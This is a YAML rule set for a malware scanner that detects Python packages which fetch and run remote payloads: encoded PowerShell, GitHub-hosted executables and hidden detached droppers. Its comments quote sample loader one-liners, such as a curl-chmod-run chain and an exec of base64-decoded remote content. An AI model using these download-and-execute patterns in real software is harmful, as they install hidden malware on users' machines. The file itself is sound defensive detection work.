defaults:
  platforms: [unix, windows]
  for: [python]
  attack: T1105
  mbc: E1105
traits:
  - id: powershell-encoded-command-in-string
    desc: PowerShell encoded command in Python string
    crit: suspicious
    conf: 0.95
    attack: T1027
    if:
      type: text
      regex: '(?i)\bpowershell\b.{0,120}\s-e(nc(oded(command)?)?)?\s+[A-Za-z0-9+/=]{20,}'
    unless:
      - id: metadata/package/testing/presence/harness::test-directory
  - id: encoded-powershell-iwr
    desc: Base64-encoded PowerShell web request
    crit: notable
    conf: 0.95
    if:
      type: encoded
      encoding: base64
      regex: '(?i)\bInvoke-WebRequest\b'
  - id: encoded-powershell-outfile
    desc: Base64-encoded PowerShell file write
    crit: notable
    conf: 0.94
    if:
      type: encoded
      encoding: base64
      regex: '(?i)-OutFile\b'
  - id: encoded-powershell-iex
    desc: Base64-encoded PowerShell expression execution
    crit: notable
    conf: 0.95
    attack: T1059.001
    if:
      type: encoded
      encoding: base64
      regex: '(?i)\bInvoke-Expression\b'
  - id: encoded-powershell-expand-archive-utf16le
    desc: UTF16LE encoded Expand-Archive
    crit: component
    conf: 0.92
    attack: T1140
    if:
      type: text
      substr: AEUAeABwAGEAbgBkAC0AQQByAGMAaABpAHYAZQ
  - id: encoded-powershell-javaw-utf16le
    desc: UTF16LE encoded javaw execution
    crit: component
    conf: 0.9
    attack: T1059
    if:
      type: text
      substr: agBhAHYAYQB3AC4AZQB4AGUA
  - id: decoded-powershell-github-raw
    desc: Decoded PowerShell GitHub raw URL
    crit: component
    conf: 0.94
    if:
      type: encoded
      regex: 'github\.com/.{1,180}/raw/'
  - id: decoded-powershell-javaw-jar
    desc: Decoded PowerShell launches javaw jar
    crit: component
    conf: 0.94
    if:
      type: encoded
      regex: '(?is)\$javaw\b.{0,320}-jar'
  - id: powershell-encoded-command-option
    desc: PowerShell encoded-command option reference
    crit: component
    conf: 0.9
    if:
      type: text
      regex: '(?i)\bpowershell(\.exe)?\b.{0,80}-(Command|EncodedCommand)\b'
  - id: powershell-long-encoded-jab-token
    desc: Long encoded PowerShell token
    crit: component
    conf: 0.9
    if:
      type: text
      regex: '\s-e(nc(oded(command)?)?)?\s+JAB[A-Za-z0-9+/=]{400,}'
  - id: github-raw-exe-url
    desc: GitHub raw executable URL
    crit: suspicious
    conf: 0.94
    if:
      type: text
      regex: 'github\.com/.{1,120}/raw/.{1,160}\.exe\b'
  - id: raw-githubusercontent-exe-url
    desc: raw.githubusercontent executable URL
    crit: suspicious
    conf: 0.94
    if:
      type: text
      regex: 'raw\.githubusercontent\.com/[^\s''"{}]{1,220}\.exe\b'
composite_rules:
  - id: python-url-shortener-download-exec
    desc: Downloads from URL shortener and executes payload
    crit: hostile
    conf: 0.95
    all:
      - id: micro-behaviors/communications/url/shortener::tinyurl
    any:
      - id: micro-behaviors/process/create/subprocess::run-content
      - id: micro-behaviors/process/create/subprocess::call
  - id: python-powershell-irm-iex
    desc: Python launches remote PowerShell content
    crit: hostile
    conf: 0.98
    all:
      - id: micro-behaviors/process/interpreter/eval::powershell-irm-iex-command-string
      - id: micro-behaviors/process/create/subprocess::popen-content
  - id: hidden-powershell-policy-bypass-installer
    desc: Hidden PowerShell installer bypasses policy
    crit: suspicious
    conf: 0.96
    near_bytes: 256
    all:
      - id: micro-behaviors/process/create/flags::powershell-hidden-window-flag
      - id: micro-behaviors/process/create/flags::powershell-hidden-window-value
      - id: micro-behaviors/process/create/flags::powershell-policy-bypass-flag
      - id: micro-behaviors/process/create/flags::powershell-policy-bypass-value
    unless:
      - id: well-known/tool/development/ai-cli/shibaclaw::shibaclaw-official-release-updater-context
  - id: python-hidden-remote-powershell-installer
    desc: Python hides remote PowerShell installer
    crit: hostile
    conf: 0.96
    attack: "T1105, T1059.001, T1562.001"
    all:
      - id: micro-behaviors/process/interpreter/eval::powershell-irm-iex-command-string
      - id: hidden-powershell-policy-bypass-installer
    unless:
      - id: well-known/tool/development/ai-cli/shibaclaw::shibaclaw-official-release-updater-context
  - id: python-download-tempfile-exec
    desc: Downloads code to temp file and executes it
    crit: suspicious
    conf: 0.9
    all:
      - id: micro-behaviors/communications/http/lib/requests::requests-get
      - id: micro-behaviors/fs/write/file/direct::python-tempfile
    any:
      - id: micro-behaviors/process/create/subprocess::run-content
      - id: micro-behaviors/process/create/subprocess::call
  - id: python-github-exe-download-exec
    desc: Python downloads GitHub EXE and runs it
    crit: hostile
    conf: 0.98
    all:
      - id: github-raw-exe-url
    # `urllib.urlretrieve` was the only fetch accepted and `run`/`popen` on a
    # content variable the only launch. Both assume the dropper does the work
    # in Python; plenty hand the whole job to the shell instead -- a
    # `subprocess.run(["powershell", "-Command", ...])` carrying `curl.exe -L
    # ... -o out.exe` and then `Start-Process` on it. Same download, same
    # execution, none of the original legs.
    needs: 2
    any:
      - id: micro-behaviors/communications/http/lib/urllib::urllib-urlretrieve-dup
      - id: micro-behaviors/communications/http/download/cli::fetch-output-flag-embedded-command
      - id: micro-behaviors/process/create/subprocess::run-content
      - id: micro-behaviors/process/create/subprocess::popen-content
      - id: micro-behaviors/process/create/subprocess::variable-command-argument
  - id: python-raw-githubusercontent-exe-download-exec
    desc: Python downloads raw GitHub EXE and runs it
    crit: hostile
    conf: 0.98
    all:
      - id: raw-githubusercontent-exe-url
      - id: micro-behaviors/communications/http/lib/urllib::urllib-urlretrieve-dup
    any:
      - id: micro-behaviors/process/create/subprocess::run-content
      - id: micro-behaviors/process/create/subprocess::popen-content
  - id: pypi-encoded-powershell-download-exec
    desc: PyPI encoded PowerShell download-execute
    crit: hostile
    conf: 0.97
    all:
      - id: metadata/build/pip::root-setup-py
      - id: powershell-encoded-command-in-string
      - id: encoded-powershell-download-exec
      - id: micro-behaviors/process/create/subprocess::popen-content
  - id: encoded-powershell-download-exec
    desc: Encoded PowerShell download-execute chain
    crit: hostile
    conf: 0.98
    attack: T1059.001,T1105,T1564.003
    all:
      - id: encoded-powershell-iwr
      - id: encoded-powershell-outfile
      - id: encoded-powershell-iex
      - id: micro-behaviors/process/create/subprocess::popen-ast
      - id: micro-behaviors/process/daemonize/spawn::powershell-hidden
  - id: powershell-long-encoded-variable
    desc: Python variable stores encoded PowerShell
    crit: suspicious
    conf: 0.95
    all:
      - id: powershell-encoded-command-option
      - id: powershell-long-encoded-jab-token
    near_lines: 1
  - id: hidden-encoded-powershell-archive-loader
    desc: Hidden encoded PowerShell archive loader
    crit: hostile
    conf: 0.98
    all:
      - id: powershell-encoded-command-in-string
      - id: encoded-powershell-expand-archive-utf16le
      - id: micro-behaviors/process/daemonize/spawn::powershell-hidden
    any:
      - id: micro-behaviors/process/create/system::python-os-system
      - id: micro-behaviors/process/create/subprocess::process-execution
  - id: hidden-encoded-powershell-execution
    desc: Hidden encoded PowerShell execution
    crit: hostile
    conf: 0.98
    all:
      - id: powershell-encoded-command-in-string
      - id: micro-behaviors/process/daemonize/spawn::powershell-hidden
    any:
      - id: micro-behaviors/process/create/system::python-os-system
      - id: micro-behaviors/process/create/subprocess::process-execution
  - id: hidden-encoded-powershell-variable-loader
    desc: Python launches hidden encoded PowerShell variable
    crit: hostile
    conf: 0.98
    all:
      - id: powershell-long-encoded-variable
      - id: micro-behaviors/process/create/shell/lang::powershell-command-fstring
      - id: micro-behaviors/process/daemonize/spawn::powershell-hidden
    any:
      - id: micro-behaviors/process/create/system::python-os-system
      - id: micro-behaviors/process/create/subprocess::process-execution
  - id: decoded-powershell-github-jar-loader
    desc: Encoded PowerShell stages GitHub jar payload
    crit: hostile
    conf: 0.98
    all:
      - id: encoded-powershell-iwr
      - id: encoded-powershell-outfile
      - id: decoded-powershell-github-raw
    any:
      - id: decoded-powershell-javaw-jar
      - id: encoded-powershell-javaw-utf16le
      - id: encoded-powershell-expand-archive-utf16le
      - id: micro-behaviors/data/archive/extract/zip::powershell-expand-archive

  # A shift-hidden URL fetched and run the moment the module is imported, with
  # the child detached and silenced.
  #
  # Each half is weak alone and decisive together. A byte-shift decoder says a
  # string is being kept out of `grep`; it does not say what the string is. A
  # detached, output-suppressed `Popen` says something is being started that
  # the user is not meant to watch or to outlive. When the module does both
  # while being imported, the hidden string is the thing being run.
  #
  # `start_new_session` is the part with no benign reading in a library: it
  # puts the child in its own process group so it survives the interpreter
  # that spawned it. A helper that genuinely needs a subprocess waits for it.
  #
  # Worked example: a package presenting itself as Kubernetes node diagnostics,
  # whose module decodes `https://github.com/.../kube-diag-linux-amd64-packed`
  # by subtracting 3 from every byte, then runs
  # `curl -sLo <hidden path> <url> && chmod +x && echo <config> | <path> &&
  # sleep 3 && rm -f <path>` through a detached shell with both streams to
  # DEVNULL.
  - id: python-shift-decoded-detached-dropper
    desc: Shift-decoded payload run detached at import
    crit: hostile
    conf: 0.97
    attack: "T1027,T1105,T1059.004"
    mbc: "B0032,E1105"
    # Deliberately not requiring `shell=True` as well: detached plus silenced
    # is already the shape, and pinning the launcher spelling would drop the
    # same dropper written with `run` or an argv list.
    all:
      - id: micro-behaviors/process/create/subprocess::subprocess-detached-session
      - id: micro-behaviors/process/create/subprocess::subprocess-suppresses-stdio
    any:
      - id: micro-behaviors/data/decode/custom::python-byte-shift-comprehension
      - id: micro-behaviors/data/decode/custom::python-char-shift-decoder

  # Fetch a payload over HTTP, decode it, and run it -- all in one expression.
  #
  # `exec(b64decode(requests.get(URL).content))` is a remote loader with no
  # local artifact: nothing is written to disk, the code exists only in memory,
  # and what runs is whatever the URL served at import time -- which the author
  # can change per victim or per day. The base64 is not protecting the payload,
  # it is keeping the transport clean; the tell is the composition, decode
  # wrapping a network read wrapped in exec.
  #
  # Distinct from the crypter rules (which decode an *embedded* blob) and from
  # the install-hook droppers (which fetch a *file* and launch it): here the
  # fetched bytes are executed directly as Python.
  #
  # Worked example: a `main()` run on a background thread at import that does
  # `exec(base64.b64decode(requests.get('https://raw.githubusercontent.com/
  # .../loader').content))`, wrapped in a bare `except: pass`.
  - id: python-remote-fetch-decode-exec
    desc: Remote payload decoded and executed in one step
    crit: hostile
    conf: 0.97
    attack: "T1105,T1027,T1059.006"
    mbc: "B0032,E1105"
    all:
      - id: objectives/anti-static/obfuscation/control-flow/logic::direct-base64-exec
      - id: micro-behaviors/communications/http/lib/requests::requests-get
    unless:
      - id: metadata/package/testing/presence/harness::verified-python-test-file
